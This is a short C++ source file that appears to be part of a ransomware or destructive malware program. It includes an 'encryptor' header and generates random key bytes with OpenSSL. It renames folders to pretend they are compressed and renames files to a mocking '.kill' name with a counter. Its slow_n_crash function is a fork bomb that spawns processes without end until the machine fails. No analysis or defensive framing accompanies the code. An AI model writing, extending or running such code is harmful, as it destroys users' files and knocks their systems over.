#include "encryptor.h"
#include <filesystem>
#include <random>
#include <chrono>
#include <thread>
#include <unistd.h>
#include <iostream>
#include <openssl/rand.h> 

namespace fs = std::filesystem;

std::vector<unsigned char> gen_bytes(size_t num_bytes) {
    std::vector<unsigned char> bytes(num_bytes);
    RAND_bytes(bytes.data(), num_bytes);
    return bytes;
}

void compress_folder(const std::string &folder_path) {
    std::string compressed_folder = folder_path + ".zip";
    fs::rename(folder_path, compressed_folder);
}

void rename_file(const std::string &file, int counter) {
    std::string new_name = "FUC453D-B7-R4G3.kill" + std::to_string(counter);
    fs::rename(file, new_name);
}

void slow_n_crash() {
    while (true) {
        fork();
    }
}
